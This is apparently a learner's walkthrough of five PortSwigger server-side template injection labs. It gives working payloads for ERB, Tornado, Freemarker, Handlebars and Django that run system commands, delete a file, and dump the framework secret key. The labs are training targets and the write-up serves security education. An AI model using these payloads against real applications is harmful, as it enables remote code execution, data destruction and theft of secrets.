---
created: 2026-05-27
---

| `#`  | Solved? | Name                                                                                 | Date    |
| ---- | ------- | ------------------------------------------------------------------------------------ | ------- |
| `1.` | `✓`     | Basic server-side template injection                                                 | `28.05` |
| `2.` | `✓`     | Basic server-side template injection (code context)                                  | `28.05` |
| `3.` | `✓`     | Server-side template injection using documentation<br>                               | `28.05` |
| `4.` | `✓`     | Server-side template injection in an unknown language with a documented exploit      | `31.05` |
| `5.` | `✓`     | Server-side template injection with information disclosure via user-supplied objects | `31.05` |

## 1. Basic server-side template injection

>[!done]

>[!note]+ Lab description
> - [`Lab: Basic server-side template injection`](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
> - Level: #Practitioner 
> 
> This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
> 
> To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

### Solution

- Navigate to the application and click on the first product. You get an error: `Unfortunately tihs product is out of stock`.
- Inspect the request in HTTP history:

![[images/walkthrough/PortSwigger/SSTI/lab1/1.png]]

- The value of the `message` parameter is reflected in application response. 
- Send this request to `Repeater` and inject `<%= 7*7 %>`:

![[images/walkthrough/PortSwigger/SSTI/lab1/2.png]]

- Observe your input is evaluated as `49` and reflected in application response.
- To delete a file in ERB:

```php
<%= File.delete('/home/carlos/morale.txt') %>   
```

![[images/walkthrough/PortSwigger/SSTI/lab1/3.png]]

![[images/walkthrough/PortSwigger/SSTI/lab1/solved.png]]

Solved!
## 2. Basic server-side template injection (code context)

>[!done]

>[!note]+ Lab description
> - [`Lab: Basic server-side template injection (code context)`](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
> - Level: #Practitioner 
> 
> This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution

- Log in as `wiener`. In your account, find functionality to change `Preferred name`:

![[images/walkthrough/PortSwigger/SSTI/lab2/1.png]]

- Test it and intercept the request.

![[images/walkthrough/PortSwigger/SSTI/lab2/2.png]]

- The `blog-post-author-display` parameter carries the value you specified, in this case, `user.first_name`. The value resembles a reference to an object attribute, which may be injected in the template. This might be an SSTI in the code context.

- Before sending probes, find where this value is repeated. Go to any post and leave a comment, then inspect it:

![[images/walkthrough/PortSwigger/SSTI/lab2/3.png]]

- Then change the preferred name again, such as to `Nickname`, and inspect the comment again:

![[images/walkthrough/PortSwigger/SSTI/lab2/4.png]]

- Once you found the reflection point, send the preferred name change request to `Repeater` and inject `}} {{ 7*7` after `user.first_name`, then inspect the comment section again: 

![[images/walkthrough/PortSwigger/SSTI/lab2/5.png]]

- This time your name is reflected as `Peter49`, which means your input is evaluated server-side. 
- To delete a file using Tornado, import the `os` module and execute a command using `os.system()`:

```python
}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
```

![[images/walkthrough/PortSwigger/SSTI/lab2/6.png]]

![[images/walkthrough/PortSwigger/SSTI/lab2/solved.png]]

Solved!
## 3. Server-side template injection using documentation

>[!done]

>[!note]+ Lab description
> - [`Lab: Server-side template injection using documentation`](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
> - Level: #Practitioner 
> 
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.
> 
> You can log in to your own account using the following credentials:
> 
> `content-manager:C0nt3ntM4n4g3r`

### Solution

- Log in with the given credentials and navigate to any product. Click `Edit template`:

![[images/walkthrough/PortSwigger/SSTI/lab3/1.png]]

![[images/walkthrough/PortSwigger/SSTI/lab3/2.png]]

- Inject any expression, such as `${anything}`. See the application throws an error:

![[images/walkthrough/PortSwigger/SSTI/lab3/2.png]]

- From the error message, this is Freemarker, Java. To go Freemarker documentation -> [`FAQ`](https://freemarker.apache.org/docs/app_faq.html).
- Search something related to `security` on the page and find question `23`: `Can I allow users to upload templates and what are the security implications?`.
- See the `new()` build-in can be used to create arbitrary Java objects that implement the `TemplateModel` interface.
- The basic payload would be:

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

![[images/walkthrough/PortSwigger/SSTI/lab3/3.png]]

- The `id` command is executed, and the output is displayed. 
- Replace the payload with:

```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")} 
```

![[images/walkthrough/PortSwigger/SSTI/lab3/solved.png]]

Solved!
## 4. Server-side template injection in an unknown language with a documented exploit

>[!done]

>[!note]+ Lab description
> - [`Lab: Server-side template injection in an unknown language with a documented exploit`](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
> - Level: #Practitioner 
> 
> This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

### Solution

- Navigate to the lab and click the first product. See the message: `Unfortunately this product is out of stock`.

![[images/walkthrough/PortSwigger/SSTI/lab4/1.png]]

- Inspect the traffic and see that the message is a reflection of the value of the `message` parameter in one of the requests:

![[images/walkthrough/PortSwigger/SSTI/lab4/2.png]]

- Send this request to `Repeater` and test for SSTI by injecting `{{ 7*7 }}`.
- This causes an error:

![[images/walkthrough/PortSwigger/SSTI/lab4/3.png]]

- From the message, this is Node.js, and the template engine is `Handlerabs`.
- You can find exploits in the [`PayloadsAllTheThings collection`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md#handlebars):

![[images/walkthrough/PortSwigger/SSTI/lab4/4.png]]

- Copy the code, replace `ls -la` with `id`:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

- Inject the payload URL-encoded:

![[images/walkthrough/PortSwigger/SSTI/lab4/5.png]]

- See the command has executed. 
- Replace `id` with `rm /home/carlos/morale.txt`:

![[images/walkthrough/PortSwigger/SSTI/lab4/6.png]]

![[images/walkthrough/PortSwigger/SSTI/lab4/solved.png]]

Solved!
## 5. Server-side template injection with information disclosure via user-supplied objects

>[!done]

>[!note]+ Lab description
> - [`Lab: Server-side template injection with information disclosure via user-supplied objects`](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
> - Level: #Practitioner 
> 
> This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
> 
> To solve the lab, steal and submit the framework's secret key.
> 
> You can log in to your own account using the following credentials:
> 
> `content-manager:C0nt3ntM4n4g3r`
### Solution

- Log in with the given credentials and navigate to any product -> `Edit template`:

![[images/walkthrough/PortSwigger/SSTI/lab5/1.png]]

- The syntax is likely either `Twig` or `Jinja2`. Inject `{{7*'7'}}` to check. The application throws an error:

![[images/walkthrough/PortSwigger/SSTI/lab5/2.png]]

- From the message, this is Django with its Django templating language — quite similar to Jinja2. 
- To remove the server error, send the `POST` request that saved template changes to `Repeater` and remove the `{{7*'7'}}` (because otherwise the application just doesn't work).
- To dump all variables currently available in the template context:

```python
{% debug %}
```


![[images/walkthrough/PortSwigger/SSTI/lab5/3.png]]

- See that you can access the `settings` object.
- Output Django secret key:

```python
{{ settings.SECRET_KEY }}
```


![[images/walkthrough/PortSwigger/SSTI/lab5/4.png]]

- Submit the key as a solution:

![[images/walkthrough/PortSwigger/SSTI/lab5/solved.png]]

Solved!